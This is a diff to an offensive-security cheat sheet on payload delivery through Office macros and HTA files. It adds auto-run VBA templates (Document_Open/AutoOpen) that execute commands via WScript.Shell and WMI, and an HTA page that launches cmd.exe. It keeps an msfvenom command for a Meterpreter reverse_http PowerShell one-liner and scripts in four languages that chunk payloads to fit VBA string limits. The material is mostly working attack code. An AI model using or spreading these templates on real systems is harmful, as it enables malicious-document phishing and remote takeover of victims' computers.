@@ -1,18 +1,65 @@
 # Payload Delivery
 
-## 01 - Macro Scripts
+## 01 - Macros
 
-- Generate a powershell one liner.
+### 1.1 - Templates
+
+Base template when macro is being executed.
+
+```
+Sub Document_Open()
+    Payload
+End Sub
+
+Sub AutoOpen()
+    Payload
+End Sub
+```
+
+Command execution.
+
+```vbscript
+Sub Payload()
+    ' VBA Macro has a 50 characters String
+    ' Limit so you have to concatenate it
+    Dim Str As String
+    Str = Str + ""
+    CreateObject("WScript.Shell").Run Str
+    ' CreateObject("WScript.Shell").Run "cmd"
+End Sub
+```
+
+Powershell one-liners, Web-Drive By, harvest SMB credentials, etc.
+
+```vbscript
+Public Function Payload() As Variant
+    Dim WindowScriptHost As Object
+    Set WindowScriptHost = VBA.CreateObject("WScript.Shell")
+    Dim waitOnReturn As Boolean: waitOnReturn = True
+    Dim windowStyle As Integer: windowStyle = 7
+    WindowScriptHost.Run "<powershell_payload>", windowStyle, waitOnReturn
+End Function
+```
+
+Using WMI method to execute the process.
+
+```vbscript
+Sub WMI_Execution()
+    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set Process = Wmi.Get("Win32_Process")
+    Process.Create("<commands>")
+End Sub
+```
+
+### 1.2 - Macro Formatting
+
+Generate a powershell one liner.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
 ```
 
-### 1.1 - Bash
-
-`$ cat vba-macro-payload-format.sh`
-
----
+#### 1.2.1 - Bash
 
 ```bash
 #!/bin/bash
@@ -31,11 +78,7 @@ do
 done
 ```
 
-### 1.2 - Python
-
-`$ cat vba-macro-payload-format.py`
-
----
+#### 1.2.2 - Python
 
 ```python
 #!/usr/bin/env python
@@ -47,9 +90,7 @@ for i in range(0, len(string), n):
     print("Str = Str + \"" + string[i:i+n] + "\"")
 ```
 
-`$ cat vba-macro-payload-format.pl`
-
----
+#### 1.2.3 - Perl
 
 ```perl
 #!/usr/bin/env perl
@@ -70,9 +111,7 @@ for(my $i = 0; $i < scalar(@characters); $i++) {
 print $concatenated_string;
 ```
 
-`$ cat vba-macro-payload-format.go`
-
----
+#### 1.2.4 - Go
 
 ```go
 package main
@@ -95,3 +134,24 @@ func main() {
     }
 }
 ```
+
+## 02 - HTA
+
+```vbscript
+<html>
+    <body>
+        <script>
+        var shell = 'cmd.exe';
+        new ActiveXObject('WScript.Shell').Run(shell);
+        </script>
+    </body>
+</html>
+```
+
+
+---
+## References
+
+- [War Room: Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)
+
+- [nicholasmckinney: Shellcode Execution Via HTA](https://gist.github.com/nicholasmckinney/e90e47e0545430656bdcca5544d6b4fc)
